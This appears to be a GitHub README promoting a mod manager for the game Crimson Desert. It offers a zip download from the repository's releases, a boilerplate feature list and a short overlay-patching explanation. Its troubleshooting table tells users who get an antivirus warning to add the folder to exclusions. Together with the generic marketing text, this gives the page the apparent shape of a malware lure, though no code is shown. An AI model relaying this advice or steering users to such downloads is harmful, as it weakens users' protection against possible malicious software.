# JSON Mod Manager for Crimson Desert

[![Stars](https://img.shields.io/github/stars/Dharma-data/JSON-Mod-Manager-Crimson-Desert)](https://github.com/Dharma-data/JSON-Mod-Manager-Crimson-Desert) [![License: MIT](https://img.shields.io/badge/License-MIT-red.svg)](https://opensource.org/licenses/MIT)

**JSON Mod Manager for Crimson Desert** is a lightweight, powerful, and easy-to-use mod manager designed specifically for **Crimson Desert**.
It allows you to easily install, enable, disable, update, and organize mods using simple and clean JSON configuration files. Perfect for both casual players and advanced modders.

<img width="1258" height="742" alt="573835727-bc6fda9c-98fa-4e3a-b814-76ff8ef5657c" src="https://github.com/user-attachments/assets/449da529-f23d-488e-8c12-66f8b051f90b" />

---

## 📦 What's Included

- JSON Mod Manager (Latest 2026 Build)
- Full support for Crimson Desert mods
- JSON-based mod configuration system
- One-click install, enable/disable, and update
- Mod conflict detection
- Backup & restore system
- Clean and modern user interface
- Portable version (no installation required)

---

## 📥 Download

📥 [`JSON-Manager.zip`](https://github.com/Dharma-data/JSON-Mod-Manager-Crimson-Desert/releases/download/Game-Addons/JSON-Manager.zip)  
---

## How It Works

The mod manager uses an **overlay system**. Instead of modifying the game's original PAZ archives, it:

1. Reads the original compressed game files from `0008/`
2. Decompresses them (LZ4), applies your chosen mod patches, and recompresses
3. Writes the patched files into a new **overlay directory** (`0036/`)
4. Registers the overlay in `meta/0.pakgt` so the game loads patched files on top of originals

---

**Advantage:** The original game files remain untouched, making the modding process safer and easier to manage or remove.

---

## ❗️ Troubleshooting

| Problem                      | Solution                                      |
|------------------------------|-----------------------------------------------|
| Manager doesn't detect game  | Manually select the game installation folder  |
| Mods not working             | Check JSON configuration and load order       |
| Game crashes after modding   | Disable mods one by one to find the conflict  |
| Antivirus warning            | Add the folder to exclusions                  |
| Mod order issues             | Use the built-in load order editor            |

---

## 📜 License

MIT License – shared for educational and modding community purposes only.

---

## ⭐️ Support

If **JSON Mod Manager for Crimson Desert** made managing your mods easier and safer — please star the repository! It helps more players enjoy modded Crimson Desert. ❤️
